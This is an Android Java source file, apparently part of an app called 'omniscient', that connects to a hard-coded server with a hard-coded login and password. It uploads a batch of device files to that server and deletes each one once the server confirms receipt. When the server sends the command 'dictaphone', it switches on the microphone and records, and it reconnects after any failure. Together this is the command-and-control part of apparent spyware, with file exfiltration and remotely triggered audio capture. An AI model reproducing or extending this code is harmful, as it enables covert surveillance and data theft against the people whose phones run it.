package com.postal.omniscient.postal.downloadFiles;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import com.postal.omniscient.MainActivity;
import com.postal.omniscient.postal.ThreadIsAliveOrNot;
import com.postal.omniscient.postal.adapter.AdapterDownloadFlag;
import com.postal.omniscient.postal.adapter.EventBusData;
import com.postal.omniscient.postal.networkStateReceiver.ConnectCheckReceiver;
import com.postal.omniscient.postal.service.AlarmReceiver;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;

/**
 * Created by Alexandr on 01.07.2016.
 *
 * Загружаем файл на сервер
 */
public class DownloadFileRun implements Runnable {
    private Socket socket;
    private OutputStream outputStream;
    private DataOutputStream dos;
    private String Msg = "MyMsg";
    private File[] allFoldersFiles = null;
    private Boolean start_download_on_event = false;
    private Context context;
    private final int SDK_INT = Build.VERSION.SDK_INT;
    private Intent intent;

    public DownloadFileRun(File[] allFoldersFiles, Context context, Intent intent) {
        this.allFoldersFiles = allFoldersFiles;
        this.context = context;
        this.intent = intent;
    }

    private void start() {
        EventBus.getDefault().register(this);
        AdapterDownloadFlag is_downloadFlag = new AdapterDownloadFlag();
        String server = "192.168.1.109";
        int port = 2221;

        String isLoaded = "isLoaded ";
        try { long fff = 13;
            socket = new Socket();//(server, port);
            socket.connect(new InetSocketAddress(server, port),2000);
            socket.setSoTimeout(50000);
            dos = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));
            send2();
            Log.d(Msg, "Postal SOCKET work");
            try {
                BufferedReader reader = new BufferedReader(
                        new InputStreamReader(socket.getInputStream()));
                String line;

                int a;
                is_downloadFlag.setTreadIsWork(false);
                boolean is_KeepConnectionFlag = true;

                while ((line = reader.readLine()) != null) {
                    Log.d(Msg, "ANSWER " + line);
                    if (line.startsWith(isLoaded)) {// сделать в оддельном потоке, что бы прием- передача
                        //были в разных потоках
                        DeleteSendOutFiles deleteSendOutFiles = new DeleteSendOutFiles(allFoldersFiles);
                        deleteSendOutFiles.setFeleNAme(line);
                        Thread startDelete = new Thread(deleteSendOutFiles);
                        //поток для удаления файлов
                        startDelete.start();
                    }

                    if (line.equals("isConnect") && !is_downloadFlag.getTreadIsWork()
                            && is_KeepConnectionFlag) {

                        //если поток передачи даннных запущен не поддерживать свъязь с сервером
                        KeepConnection keep_con = new KeepConnection(dos, is_downloadFlag,
                                is_KeepConnectionFlag);
                        keep_con.setName("KeepConnection");
                        keep_con.start();
                        //  is_KeepConnectionFlag = false;
                        Log.e(Msg, "Название потока поддержки свъязи с сервером "+ keep_con.getName().toString());
                    }

                    if (line.equals("ok")) {
//                        dos.writeUTF("isConnect");//начать поддержку соединения
//                        dos.flush();
                        if (allFoldersFiles != null) {
                            //отправка в новом потоке
                            SendFileToServer dwnloadFile = new SendFileToServer(allFoldersFiles,
                                    socket, dos, is_downloadFlag);
                            Thread startDownlow = new Thread(dwnloadFile);
                            //поток для загрузки файлов на сервер
                            startDownlow.start();
                        }
                    } //else break;dos.close();socket.close();

                    //команда на включение диктофона
                    if (line.equals("dictaphone")) {
                        if (!new ThreadIsAliveOrNot("DictaphoneRecord").liveORnot()) {
                            Dictaphone dict = new Dictaphone(is_downloadFlag, context);
                            dict.setName("DictaphoneRec");
                            dict.start();
                            Log.i(Msg, "  ДИКТОФОН ВКЛЮЧЕН");
                            dos.writeUTF("dictaphone_on");
                            dos.flush();
                        }
                    }
                }
            } catch (IOException ex) { Log.e(Msg, "Eror "+ex);
                EventBus.getDefault().unregister(this);
                dos.close();socket.close();
                notGiveUp();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        //outputStream = socket.getOutputStream();


    }

    private void notGiveUp() {

        Log.i(Msg, "notGiveUp start ");
        String requiredPermission = "notGiveUpConnectCheckReceiver";
        context.sendBroadcast(intent, requiredPermission);
    }

    @Subscribe(threadMode = ThreadMode.BACKGROUND)
    public void onComand(EventBusData event){
        start_download_on_event = true;
    }

    /** Send a line of text
     * file_Name имя файла, folder_Name имя папки, patch путь к файлу*/


    public void send2() {
        try {
            JSONObject aouth = new JSONObject();//Заголовок
            JSONObject log_pass = new JSONObject();

            aouth.put("Login", "postal");
            aouth.put("Password", "33954");
            log_pass.put("Aouth", aouth);

            dos.writeUTF(log_pass.toString());
            dos.flush();
//        new EventBus(){
//    @Subscribe(threadMode = ThreadMode.BACKGROUND)
//    public void onComand(EventBusData event){
//        start_download_on_event = true;
//    }
//};
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
    /** Close the socket */
    public void close() {
        try {
            socket.close();
        } catch (IOException ex) {
          //  notifyObservers(ex);
        }
    }



    @Override
    public void run() {

        Log.i(Msg, "Postal work start");
        start();
        Log.i(Msg, "Postal work END");
    }


}
